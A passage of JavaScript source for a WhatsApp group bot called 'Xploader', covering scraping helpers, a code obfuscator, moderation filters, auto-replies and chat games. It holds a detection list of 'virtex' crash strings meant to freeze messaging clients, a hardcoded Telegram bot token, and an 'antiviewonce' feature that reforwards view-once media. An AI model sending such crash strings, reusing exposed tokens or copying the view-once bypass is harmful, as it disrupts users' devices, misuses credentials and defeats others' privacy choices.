      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
    }
    //bug loading
    async function loading() {
      var XpBotlod = [
        "```▓▒░(𝗟𝗢𝗔𝗗𝗜𝗡𝗚)░▒▓```",
        "```■□□□□□□□□□ 10%```",
        "```■■□□□□□□□□ 20%```",
        "```■■■□□□□□□□ 30%```",
        "```■■■■□□□□□□ 40%```",
        "```■■■■■□□□□□ 50%```",
        "```■■■■■■□□□□ 60%```",
        "```■■■■■■■□□□ 70%```",
        "```■■■■■■■■□□ 80%```",
        "```■■■■■■■■■□ 90%```",
        "```■■■■■■■■■■ 100%```",
        "```▓▒░(𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 𝗕𝗢𝗧)░▒▓```",
      ];
      let { key } = await Xploader.sendMessage(from, {
        text: "ʟᴏᴀᴅɪɴɢ...",
      });

      for (let i = 0; i < XpBotlod.length; i++) {
        await Xploader.sendMessage(from, { text: XpBotlod[i], edit: key });
      }
    }

    async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1,
          });
          const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode(),
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }
    //random number
    function getRandomNumber(min, max) {
      min = Math.ceil(min);
      max = Math.floor(max);
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    async function styletext(teks) {
      return new Promise((resolve, reject) => {
        axios
          .get("http://qaz.wtf/u/convert.cgi?text=" + teks)
          .then(({ data }) => {
            let $ = cheerio.load(data);
            let hasil = [];
            $("table > tbody > tr").each(function (a, b) {
              hasil.push({
                name: $(b).find("td:nth-child(1) > span").text(),
                result: $(b).find("td:nth-child(2)").text().trim(),
              });
            });
            resolve(hasil);
          });
      });
    }

    async function Telesticker(url) {
      return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi))
          return reply("*_Enter your telegram sticker link_*");
        packName = url.replace("https://t.me/addstickers/", "");
        data = await axios(
          `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(
            packName
          )}`,
          { method: "GET", headers: { "User-Agent": "GoogleBot" } }
        );
        const XpBotresult = [];
        for (let i = 0; i < data.data.result.stickers.length; i++) {
          fileId = data.data.result.stickers[i].thumb.file_id;
          data2 = await axios(
            `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`
          );
          result = {
            status: 200,
            author: "Tylor",
            url:
              "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" +
              data2.data.result.file_path,
          };
          XpBotresult.push(result);
        }
        resolve(XpBotresult);
      });
    }

    //limit func
    async function useLimit(senuseLimitder, amount) {
      db.data.users[sender].limit -= amount;
      db.data.users[sender].totalLimit += amount;
      reply(
        `*_You have used up: ${amount} limit_*\n*_Remaining: ${db.data.users[sender].limit} limit_*`
      );
    }
    async function resetLimit() {
      let users = Object.keys(global.db.data.users);
      let LimitXpBot = isPremium ? limit.prem : limit.free;
      for (let i of users) {
        db.data.users[i].limit = LimitXpBot;
      }
      Xploader.sendText("120363167338947238@g.us", { text: `Reset Limit` });
    }
    // Grup Only
    if (!m.isGroup && !XpBotOwner && db.data.settings[botNumber].onlygroup) {
      if (isCommand) {
        return reply(
          `*_Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !_*\n\n*_If you have issue please chat owner wa.me/${ownernumber}_*`
        );
      }
    }
    // Private Only
    if (!XpBotOwner && db.data.settings[botNumber].onlypc && m.isGroup) {
      if (isCommand) {
        return reply(
          "*_Hello buddy! if you want to use this bot, please chat the bot in private chat_*"
        );
      }
    }

    if (!Xploader.public) {
      if (XpBotOwner && !m.key.fromMe) return;
    }
    if (db.data.settings[botNumber].online) {
      if (isCommand) {
        Xploader.sendPresenceUpdate("unavailable", from);
      }
    }
    if (db.data.settings[botNumber].autoread) {
      Xploader.readMessages([m.key]);
    }
    //auto set bio\\
    if (db.data.settings[botNumber].autobio) {
      Xploader.updateProfileStatus(
        `𝐀𝐥𝐥 𝐡𝐚𝐢𝐥 𝐭𝐨 ${botname} 𝐛𝐨𝐭, 𝐚𝐜𝐭𝐢𝐯𝐞 𝐟𝐨𝐫 ${runtime(
          process.uptime()
        )}`
      ).catch((_) => _);
    }
    //auto type record
    if (db.data.settings[botNumber].autorecordtype) {
      if (isCommand) {
        let XpBotmix = ["composing", "recording"];
        XpBotmix2 = XpBotmix[Math.floor(XpBotmix.length * Math.random())];
        Xploader.sendPresenceUpdate(XpBotmix2, from);
      }
    }
    if (db.data.settings[botNumber].autorecord) {
      if (isCommand) {
        let XpBotmix = ["recording"];
        XpBotmix2 = XpBotmix[Math.floor(XpBotmix.length * Math.random())];
        XpBot.sendPresenceUpdate(XpBotmix2, from);
      }
    }
    if (db.data.settings[botNumber].autotype) {
      if (isCommand) {
        let XpBotpos = ["composing"];
        Xploader.sendPresenceUpdate(XpBotpos, from);
      }
    }

    //auto block number
    if (
      m.sender.startsWith(`${autoblocknumber}`) &&
      db.data.settings[botNumber].autoblocknum === true
    ) {
      return Xploader.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith("91") &&
      db.data.settings[botNumber].onlyindia === true
    ) {
      return Xploader.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith("62") &&
      db.data.settings[botNumber].onlyindo === true
    ) {
      return Xploader.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith(`${antiforeignnumber}`) &&
      db.data.chats[m.chat].antiforeignnum === true
    ) {
      if (XpBotOwner || isAdmins || !isBotAdmins) return;
      Xploader.sendMessage(
        m.chat,
        {
          text: `*_Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group_*`,
        },
        { quoted: m }
      );
      await sleep(2000);
      await Xploader.groupParticipantsUpdate(m.chat, [m.sender], "remove");
    }
    let list = [];
    for (let i of owner) {
      list.push({
        displayName: await Xploader.getName(i),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Xploader.getName(
          i
        )}\nFN:${await Xploader.getName(
          i
        )}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    //console log
    if (isCommand) {
      console.log(
        color(
          `\n< ================================================== >\n`,
          "cyan"
        )
      );
      console.log(
        chalk.black(chalk.bgWhite(!isCommand ? "[ MESSAGE ]" : "[ COMMAND ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
        chalk.green(m.isGroup ? pushname : "Private Chat", m.chat)
      );
      global.db.data.settings[botNumber].totalhit += 1;
    }

    //antiviewonce
    if (
      db.data.chats[m.chat].antiviewonce &&
      m.isGroup &&
      m.mtype == "viewOnceMessageV2"
    ) {
      let val = { ...m };
      let msg =
        val.message?.viewOnceMessage?.message ||
        val.message?.viewOnceMessageV2?.message;
      delete msg[Object.keys(msg)[0]].viewOnce;
      val.message = msg;
      await Xploader.sendMessage(m.chat, { forward: val }, { quoted: m });
    }
    //ANTI VIRUS
    if (isGroup && db.data.chats[m.chat].antivirtex) {
      if (
        budy.includes("๒๒๒๒") ||
        budy.includes("ดุ") ||
        budy.includes("ผิดุท้เึางืผิดุท้เึางื") ||
        budy.includes("๑๑๑๑๑๑๑๑") ||
        budy.includes("৭৭৭৭৭৭৭৭") ||
        budy.includes("   ⃢   ⃢   ⃢  ") ||
        budy.includes(
          "*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟"
        ) ||
        budy.includes("ผดิทุเ้ึางผืดิทุเ้") ||
        budy.includes(".*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*") ||
        budy.includes("᥋") ||
        budy.includes("؁") ||
        budy.includes("ٯٯٯٯٯ")
      ) {
        if (isGroupAdmins) return reply("*VIRTEX DETECTED*");
        console.log(
          color("[KICK]", "red"),
          color("Received a virus text!", "yellow")
        );
        Xploader.sendText(
          m.chat,
          `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${
            sender.split("@")[0]
          }`
        );
        if (!isBotAdmins) return;
        if (XpBotOwner) return;
        Xploader.groupParticipantsUpdate(from, [sender], "remove");
        await Xploader.sendMessage(from, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        Xploader.sendMessage(`${ownernumber}@s.whatsapp.net`, {
          text: `Hi Owner! wa.me/${
            sender.split("@")[0]
          } Detected Having Sent Virtex ${isGroup ? `in ${groupName}` : ""}`,
        });
      }
    }

    if (db.data.chats[m.chat].antibot) {
      if (m.isBaileys && m.fromMe == false) {
        if (isAdmin || !isBotAdmin) {
        } else {
          reply(
            `*Another Bot Detected*\n\nHusshhh Get away from this group!!!`
          );
          return await Xploader.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
        }
      }
    }

    //anti media
    if (db.data.chats[m.chat].antimedia && isMedia) {
      if (XpBotOwner || isAdmins || !isBotAdmins) {
      } else {
        reply(
          `\`\`\`「 Media Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-media for this group_*`
        );
        return Xploader.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
      }
    }
    if (db.data.chats[m.chat].image && isXploaderMedia) {
      if (isXploaderMedia === "imageMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Image Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-image for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antivideo && isXploaderMedia) {
      if (isXploaderMedia === "videoMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Video Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-video for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antisticker && isXploaderMedia) {
      if (isXploaderMedia === "stickerMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Sticker Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antiaudio && isXploaderMedia) {
      if (isXploaderMedia === "audioMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Audio Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-audio for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antipoll && isXploaderMedia) {
      if (isXploaderMedia === "pollCreationMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Poll Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-poll for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antilocation && isXploaderMedia) {
      if (isXploaderMedia === "locationMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Location Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-location for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antidocument && isXploaderMedia) {
      if (isXploaderMedia === "documentMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Document Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-document for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].anticontact && isXploaderMedia) {
      if (isXploaderMedia === "contactMessage") {
        if (XpBotOwner || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Contact Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-contact for this group_*`
          );
          return Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    //respond
    if (db.data.chats[m.chat].badword) {
      for (let bak of bad) {
        if (budy === bak) {
          let baduser = await db.data.users[sender].badword;
          Xploader.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
          Xploader.sendMessage(
            from,
            {
              text: `\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${
                m.sender.split("@")[0]
              } *_was using harsh words and his chat has been deleted_*`,
              contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
          );
        }
      }
    }
    //autosticker
    if (db.data.settings[botNumber].autosticker) {
      if (m.key.fromMe) return;
      if (/image/.test(mime) && !/webp/.test(mime)) {
        let mediac = await quoted.download();
        Xploader.sendImageAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
        console.log(`Auto sticker detected`);
      } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return;
        let mediac = await quoted.download();
        Xploader.sendVideoAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
      }
    }

    if (db.data.chats[m.chat].antilinkgc) {
      if (budy.match(`chat.whatsapp.com`)) {
        bvl = `\`\`\`「GROUP LINK DETECTED」\`\`\`\n\n*Admin ${pushname} has sent a group link, admin is free to send any link😇*`;
        if (isAdmins) return reply(bvl);
        if (m.key.fromMe) return reply(bvl);
        if (XpBotOwner) return reply(bvl);
        await Xploader.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        Xploader.sendMessage(
          from,
          {
            text: `\`\`\`「GROUP LINK DETECTED」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } *Beware, links are not allowed in this group!*`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    if (db.data.chats[m.chat].antilink) {
      if (budy.match("http") && budy.match("https")) {
        bvl = `\`\`\`「LINK DETECTED」\`\`\`\n\n*Admin ${pushname} has sent a link, admin is free to send any link😇*`;
        if (isAdmins) return reply(bvl);
        if (m.key.fromMe) return reply(bvl);
        if (XpBotOwner) return reply(bvl);
        await Xploader.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        Xploader.sendMessage(
          from,
          {
            text: `\`\`\`「LINK DETECTED」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } *Beware, links are not allowed in this group!*`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    //afk
    let mentionUser = [
      ...new Set([
        ...(m.mentionedJid || []),
        ...(m.quoted ? [m.quoted.sender] : []),
      ]),
    ];
    for (let jid of mentionUser) {
      let user = db.data.users[jid];
      if (!user) continue;
      let afkTime = user.afkTime;
      let nick = user.nick;
      if (!afkTime || afkTime < 0) continue;
      let afkDuration = formatAfkDuration(new Date() - user.afkTime);
      let reason = user.afkReason || "";
      reply(
        `Don't Mention.. *${nick}* is currently AFK ${
          reason ? "for: " + reason : reason
        }\nAFK Since \`${afkDuration}\``
      );
    }
    if (db.data.users[m.sender].afkTime > -1) {
      let user = global.db.data.users[m.sender];
      let afkDuration = formatAfkDuration(new Date() - user.afkTime);

      reply(`Welcome back...\nYou were away for: \`${afkDuration}\``);

      user.afkTime = -1;
      user.afkReason = "";
    }
 //total features
    const Xliconfeature = () => {
      var mytext = fs.readFileSync("./Xploader.js").toString();
      var numUpper = (mytext.match(/case "/g) || []).length;
      return numUpper;
    };
        //autoreply
    for (let BhosdikaXpBot of VoiceNote) {
      if (budy === BhosdikaXpBot) {
        let audiobuffy = fs.readFileSync(
          `./XploaderMedia/audio/${BhosdikaXpBot}.mp3`
        );
        Xploader.sendMessage(
          m.chat,
          { audio: audiobuffy, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXpBot of StickerXp) {
      if (budy === BhosdikaXpBot) {
        let stickerbuffy = fs.readFileSync(
          `./XploaderMedia/sticker/${BhosdikaXpBot}.webp`
        );
        Xploader.sendMessage(
          m.chat,
          { sticker: stickerbuffy },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXpBot of ImageXp) {
      if (budy === BhosdikaXpBot) {
        let imagebuffy = fs.readFileSync(
          `./XploaderMedia/image/${BhosdikaXpBot}.jpg`
        );
        Xploader.sendMessage(m.chat, { image: imagebuffy }, { quoted: m });
      }
    }
    for (let BhosdikaXpBot of VideoXp) {
      if (budy === BhosdikaXpBot) {
        let videobuffy = fs.readFileSync(
          `./XploaderMedia/video/${BhosdikaXpBot}.mp4`
        );
        Xploader.sendMessage(m.chat, { video: videobuffy }, { quoted: m });
      }
    }

    const sendapk = (teks) => {
      Xploader.sendMessage(
        from,
        { document: teks, mimetype: "application/vnd.android.package-archive" },
        { quoted: m }
      );
    };
    for (let BhosdikaXpBot of ApkXp) {
      if (budy === BhosdikaXpBot) {
        let buffer = fs.readFileSync(`./XploaderMedia/apk/${BhosdikaXpBot}.apk`);
        sendapk(buffer);
      }
    }

    const sendzip = (teks) => {
      Xploader.sendMessage(
        from,
        { document: teks, mimetype: "application/zip" },
        { quoted: m }
      );
    };
    for (let BhosdikaXpBot of ZipXp) {
      if (budy === BhosdikaXpBot) {
        let buffer = fs.readFileSync(`./XploaderMedia/zip/${BhosdikaXpBot}.zip`);
        sendzip(buffer);
      }
    }

    const senddocu = (teks) => {
      Xploader.sendMessage(
        from,
        { document: teks, mimetype: "application/pdf" },
        { quoted: m }
      );
    };
    for (let BhosdikaXpBot of DocXp) {
      if (budy === BhosdikaXpBot) {
        let buffer = fs.readFileSync(`./XploaderMedia/doc/${BhosdikaXpBot}.pdf`);
        senddocu(buffer);
      }
    }

    // Respon Cmd with media
    if (
      isMedia &&
      m.msg.fileSha256 &&
      m.msg.fileSha256.toString("base64") in global.db.data.sticker
    ) {
      let hash = global.db.data.sticker[m.msg.fileSha256.toString("base64")];
      let { text, mentionedJid } = hash;
      let messages = await generateWAMessage(
        m.chat,
        { text: text, mentions: mentionedJid },
        {
          userJid: Xploader.user.id,
          quoted: m.quoted && m.quoted.fakeObj,
        }
      );
      messages.key.fromMe = areJidsSameUser(m.sender, Xploader.user.id);
      messages.key.id = m.key.id;
      messages.pushName = m.pushName;
      if (m.isGroup) messages.participant = m.sender;
      let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: "append",
      };
      Xploader.ev.emit("messages.upsert", msg);
    }
//math
    if (kuismath.hasOwnProperty(m.sender.split("@")[0]) && isCmd2) {
      if (m.key.fromMe) return;
      kuis = true;
      jawaban = kuismath[m.sender.split("@")[0]];
      if (budy.toLowerCase() == jawaban) {
        await reply(
          `*_🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode_*`
        );
        delete kuismath[m.sender.split("@")[0]];
      } else reply("*Wrong Answer!*");
    }

    //game
    this.game = this.game ? this.game : {};
    let room = Object.values(this.game).find(
      (room) =>
        room.id &&
        room.game &&
        room.state &&
        room.id.startsWith("tictactoe") &&
        [room.game.playerX, room.game.playerO].includes(m.sender) &&
        room.state == "PLAYING"
    );
    if (room) {
      let ok;
      let isWin = !1;
      let isTie = !1;
      let isSurrender = !1;
      // reply(`[DEBUG]\n${parseInt(m.text)}`)
      if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return;
      isSurrender = !/^[1-9]$/.test(m.text);
      if (m.sender !== room.game.currentTurn) {
        if (!isSurrender) return !0;
      }
      if (
        !isSurrender &&
        1 >
          (ok = room.game.turn(
            m.sender === room.game.playerO,
            parseInt(m.text) - 1
          ))
      ) {
        reply(
          {
            "-3": "The game is over",
            "-2": "Invalid",
            "-1": "Invalid Position",
            0: "Invalid Position",
          }[ok]
        );
        return !0;
      }
      if (m.sender === room.game.winner) isWin = true;
      else if (room.game.board === 511) isTie = true;
      let arr = room.game.render().map((v) => {
        return {
          X: "❌",
          O: "⭕",
          1: "1️⃣",
          2: "2️⃣",
          3: "3️⃣",
          4: "4️⃣",
          5: "5️⃣",
          6: "6️⃣",
          7: "7️⃣",
          8: "8️⃣",
          9: "9️⃣",
        }[v];
      });
      if (isSurrender) {
        room.game._currentTurn = m.sender === room.game.playerX;
        isWin = true;
      }
      let winner = isSurrender ? room.game.currentTurn : room.game.winner;
      let str = `Room ID: ${room.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

${
  isWin
    ? `@${winner.split("@")[0]} Won!`
    : isTie
    ? `Game over`
    : `Turn ${["❌", "⭕"][1 * room.game._currentTurn]} (@${
        room.game.currentTurn.split("@")[0]
      })`
}
❌: @${room.game.playerX.split("@")[0]}
⭕: @${room.game.playerO.split("@")[0]}

Type *surrender* to surrender and admit defeat`;
      if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
        room[room.game._currentTurn ^ isSurrender ? "x" : "o"] = m.chat;
      if (room.x !== room.o)
        Xploader.sendText(room.x, str, m, {
          mentions: parseMention(str),
        });
      Xploader.sendText(room.o, str, m, {
        mentions: parseMention(str),
      });
      if (isTie || isWin) {
        delete this.game[room.id];
      }
    }

    //RPS
    this.suit = this.suit ? this.suit : {};
    let roof = Object.values(this.suit).find(
      (roof) => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender)
    );
    if (roof) {
      let win = "";
      let tie = false;
      if (
        m.sender == roof.p2 &&
        /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(
          m.text
        ) &&
        m.isGroup &&
        roof.status == "wait"
      ) {
        if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
          Xploader.sendTextWithMentions(
            m.chat,
            `@${roof.p2.split`@`[0]} rejected the challange, what a loser.`,
            m
          );
          delete this.suit[roof.id];
          return !0;
        }
        roof.status = "play";
        roof.asal = m.chat;
        clearTimeout(roof.waktu);
        //delete roof[roof.id].waktu
        Xploader.sendText(
          m.chat,
          `Game has been sent in DMs

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose an option in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`,
          m,
          { mentions: [roof.p, roof.p2] }
        );
        if (!roof.pilih)
          Xploader.sendText(
            roof.p,
            `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`,
            m
          );
        if (!roof.pilih2)
          Xploader.sendText(
            roof.p2,
            `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`,
            m
          );
        roof.waktu_milih = setTimeout(() => {
          if (!roof.pilih && !roof.pilih2)
            Xploader.sendText(
              m.chat,
              `Both Players Don't Want To Play,\nGame Canceled`
            );
          else if (!roof.pilih || !roof.pilih2) {
            win = !roof.pilih ? roof.p2 : roof.p;
            Xploader.sendTextWithMentions(
              m.chat,
              `@${
                (roof.pilih ? roof.p2 : roof.p).split`@`[0]
              } Didn't Choose an Option, Game Over!`,
              m
            );
          }
          delete this.suit[roof.id];
          return !0;
        }, roof.timeout);
      }
      let jwb = m.sender == roof.p;
      let jwb2 = m.sender == roof.p2;
      let g = /scissors/i;
      let b = /rock/i;
      let k = /paper/i;
